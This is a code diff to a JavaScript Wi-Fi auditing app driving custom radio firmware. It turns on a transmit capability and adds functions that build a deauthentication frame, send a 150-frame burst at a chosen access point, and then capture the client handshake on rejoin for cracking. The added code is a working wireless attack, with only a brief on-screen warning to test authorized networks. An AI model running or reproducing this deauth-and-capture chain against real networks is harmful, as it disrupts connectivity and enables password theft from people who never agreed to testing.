@@ -11,6 +11,7 @@ import { CaptureSession } from './capture.js';
 import { analyzeChunks, findings } from './analyze.js';
 import { plan, reportText, topTarget } from './analysis.js';
 import { attackList, blockedOnTransmit } from './attacks.js';
+import { buildDeauth } from './attack.js';
 import { extractHandshakes, hashFile } from './crack.js';
 import { CrackBridge } from './bridge.js';
 
@@ -693,11 +694,15 @@ function analysisPlanHtml(p) {
 // radio to transmit, which our firmware cannot do — that is a firmware
 // question, and the panel says so instead of pretending otherwise.
 
-// Our firmware has no transmit path: it can sniff and it can sync, and that is
-// all. This is the single honest answer to "can the radio inject?", and it
-// flips to true the day a TX command exists in firmware/ — at which point the
-// three transmit attacks light up without any change to the list itself.
-const FIRMWARE_CAN_TRANSMIT = false;
+// Our firmware has a transmit path as of 0.3.0-tx: the TX_FRAME command takes a
+// frame the app built and puts it on the air. This is the single honest answer
+// to "can the radio inject?" — and it is not taken on faith. It was verified by
+// injecting a beacon carrying this board's own MAC and reading it back with an
+// independent receiver, then confirming the channel by doing it again on a
+// different one. Flip this back to false only if the flashed firmware has no
+// TX_FRAME — the panel will then block the three transmit attacks again, which
+// is the correct behaviour rather than a regression.
+const FIRMWARE_CAN_TRANSMIT = true;
 
 const BRIDGE_DEFAULT_URL = 'http://192.168.1.169:8099';
 
@@ -706,6 +711,8 @@ let bridgeStatus = null;      // last /health reading, null until tested
 let bridgeError = null;
 let crackJob = null;          // live progress: {state, progress, speed_hs, ...}
 let crackRunning = false;
+let txResult = null;          // last burst: {phase, requested, sent, failed, ...}
+let txRunning = false;
 
 function bridgeConfig() {
   return {
@@ -722,7 +729,7 @@ function bridgeClient() {
 /** Everything the attack list needs to judge readiness. */
 function attackContext() {
   return {
-    hasCapture: !!capture.writer?.chunks?.length,
+    hasCapture: !!capture?.writer?.chunks?.length,
     hasHandshake: !!handshakeResult?.handshakes?.length,
     canTransmit: FIRMWARE_CAN_TRANSMIT,
     bridgeReachable: !!bridgeStatus?.ok,
@@ -758,6 +765,7 @@ function renderAttackPanel(box) {
       }${escapeHtml(a.firmwareNote)}</div>` : ''}
       ${blockers ? `<ul class="blockers">${blockers}</ul>` : ''}
       ${a.id === 'crack' ? crackActionHtml(a) : ''}
+      ${a.id === 'handshake' ? deauthActionHtml(a) : ''}
     </div>`;
   }).join('');
 
@@ -814,6 +822,8 @@ function renderAttackPanel(box) {
   $('#brTest')?.addEventListener('click', onBridgeTest);
   $('#crackExtract')?.addEventListener('click', onExtractHandshakes);
   $('#crackRun')?.addEventListener('click', onCrackRun);
+  $('#deauthGo')?.addEventListener('click', onDeauthCapture);
+  $('#deauthStop')?.addEventListener('click', onDeauthStop);
 }
 
 function bridgeStateHtml() {
@@ -921,6 +931,168 @@ function crackActionHtml(a) {
     </div>`;
 }
 
+/**
+ * The forced-handshake controls.
+ *
+ * This is the one attack that puts something on the air, so the panel is built
+ * around showing what actually happened rather than what was asked for: the
+ * firmware clamps the burst and reports the clamped numbers back, and those are
+ * the numbers on screen.
+ *
+ * The chain is deliberately two steps the operator can see — burst, then
+ * listen — rather than one opaque action. A deauth that reports success while
+ * nothing was captured is the failure mode worth designing against, and you can
+ * only tell those apart if the two halves report separately.
+ */
+function deauthActionHtml(a) {
+  if (!a.ready) return '';
+
+  const t = analysisPlan ? topTarget(analysisPlan) : null;
+  if (!t) {
+    return `<div class="crackbox">
+      <div class="crackstate">no target chosen</div>
+      <div class="crackmeta">Build the Analysis plan first — the burst needs a BSSID and a
+        channel, and the plan is what picks them.</div>
+    </div>`;
+  }
+
+  const head = `
+    <div class="crackmeta">Target <b>${escapeHtml(t.ssid || '(no name)')}</b> ·
+      ${escapeHtml(t.bssid)} · channel ${t.channel ?? '?'}</div>`;
+
+  if (txRunning) {
+    const r = txResult || {};
+    return `<div class="crackbox">
+      ${head}
+      <div class="crackstate">${Icon('antenna', { size: 15 })}${escapeHtml(r.phase || 'transmitting')}</div>
+      <div class="crackmeta">${r.requested ?? 0} frames requested · ${r.count ?? 0} after the
+        firmware's clamp · ${r.interval_ms ?? 0} ms apart</div>
+      <div class="row" style="margin-top:8px">
+        <button id="deauthStop" class="ghost">${Icon('unlink', { size: 18 })}Stop</button>
+      </div>
+    </div>`;
+  }
+
+  if (txResult) {
+    const r = txResult;
+    const ok = r.sent > 0;
+    const clamped = r.requested !== r.count;
+    return `<div class="crackbox ${ok ? 'win' : ''}">
+      ${head}
+      <div class="crackstate">${ok ? Icon('check', { size: 15 }) + 'burst done' : Icon('alert', { size: 15 }) + 'nothing went out'}</div>
+      <div class="crackmeta">${r.sent} of ${r.count} frames sent · ${r.failed} refused by the driver
+        · channel ${r.channel}${clamped ? ` · clamped from ${r.requested}` : ''}</div>
+      ${r.note ? `<div class="crackmeta">${escapeHtml(r.note)}</div>` : ''}
+      <div class="row" style="margin-top:8px">
+        <button id="deauthGo" class="ghost">${Icon('refresh', { size: 18 })}Fire again</button>
+      </div>
+    </div>`;
+  }
+
+  return `<div class="crackbox">
+    ${head}
+    <div class="crackmeta">Sends a deauth burst at this BSSID, then starts a capture to catch the
+      rejoin. This puts frames on the air — only run it against a network you are allowed to test.</div>
+    <div class="row" style="margin-top:8px">
+      <button id="deauthGo" class="primary">${Icon('capture', { size: 18 })}Fire the burst</button>
+    </div>
+  </div>`;
+}
+
+/** Turn a frame's bytes into the hex TX_FRAME expects. */
+function frameHex(u8) {
+  return Array.from(u8).map((b) => b.toString(16).padStart(2, '0')).join('');
+}
+
+async function onDeauthCapture() {
+  const t = analysisPlan ? topTarget(analysisPlan) : null;
+  if (!t?.bssid) { log('err', 'deauth: no target — build the plan first'); return; }
+  if (t.channel == null) { log('err', 'deauth: target has no channel'); return; }
+
+  // The burst shape. These are what the app ASKS for; the firmware clamps them
+  // and its reply is what gets stored, so the panel can never claim more than
+  // the radio did.
+  const count = 150;
+  const intervalMs = 30;
+
+  txRunning = true;
+  txResult = { phase: 'transmitting', requested: count, count, interval_ms: intervalMs, channel: t.channel };
+  renderStagePanel();
+
+  let frame;
+  try {
+    frame = buildDeauth({ bssid: t.bssid, reason: 7, seq: 1 });
+  } catch (e) {
+    txRunning = false; txResult = null;
+    log('err', 'deauth: could not build the frame — ' + e.message);
+    renderStagePanel();
+    return;
+  }
+
+  try {
+    const resp = await request('TX_FRAME', {
+      hex: frameHex(frame), channel: t.channel, count, interval_ms: intervalMs,
+    }, { timeoutMs: 10000 });
+    if (!resp?.ok) throw new Error(resp?.error || 'the firmware refused the burst');
+
+    // Store the firmware's numbers, not ours — this is the whole point.
+    txResult = {
+      ...txResult,
+      requested: resp.requested ?? count,
+      count: resp.count ?? count,
+      interval_ms: resp.interval_ms ?? intervalMs,
+      channel: resp.channel ?? t.channel,
+      frame_len: resp.frame_len,
+      phase: 'transmitting',
+    };
+    log('ev', `deauth: burst started — ${resp.count} frames on ch${resp.channel}, ${resp.interval_ms} ms apart`);
+    renderStagePanel();
+
+    // Wait out the burst, then listen for the rejoin. The firmware paces it, so
+    // the app's wait is just the burst's own duration plus a margin.
+    await new Promise((r) => setTimeout(r, (resp.count ?? count) * (resp.interval_ms ?? intervalMs) + 700));
+
+    const st = await request('TX_STATUS', {}, { timeoutMs: 5000 });
+    txResult = { ...txResult, sent: st?.sent ?? 0, failed: st?.failed ?? 0, phase: 'done' };
+    log('ev', `deauth: ${st?.sent ?? 0} frames sent, ${st?.failed ?? 0} refused`);
+
+    // Now the second half: listen for the handshake the burst was meant to provoke.
+    txRunning = false;
+    renderStagePanel();
+    await onStartCaptureAfterBurst(t.channel);
+  } catch (e) {
+    txResult = { ...txResult, sent: 0, failed: 0, phase: 'failed', note: e.message };
+    log('err', 'deauth: ' + e.message);
+  }
+  txRunning = false;
+  renderStagePanel();
+}
+
+/** Start a capture on the target's channel — the listening half of the chain. */
+async function onStartCaptureAfterBurst(channel) {
+  if (capture.running) { log('ev', 'deauth: capture already running, leaving it alone'); return; }
+  try {
+    await capture.start({ channel, durationMs: 20000 });
+    log('ev', `capture: listening on ch${channel} for the rejoin — 20 s`);
+    renderStagePanel();
+    startCapTicker();
+  } catch (e) {
+    log('err', 'capture after burst: ' + e.message);
+  }
+}
+
+async function onDeauthStop() {
+  try {
+    const st = await request('TX_STOP', {}, { timeoutMs: 5000 });
+    txResult = { ...(txResult || {}), sent: st?.sent ?? 0, failed: st?.failed ?? 0, phase: 'stopped' };
+    log('ev', `deauth: stopped after ${st?.sent ?? 0} frames`);
+  } catch (e) {
+    log('err', 'deauth stop: ' + e.message);
+  }
+  txRunning = false;
+  renderStagePanel();
+}
+
 async function onBridgeTest() {
   bridgeError = null; bridgeStatus = null;
   renderStagePanel();
@@ -935,7 +1107,7 @@ async function onBridgeTest() {
 }
 
 function onExtractHandshakes() {
-  const w = capture.writer;
+  const w = capture?.writer;
   if (!w?.chunks?.length) return;
   const t0 = Date.now();
   try {
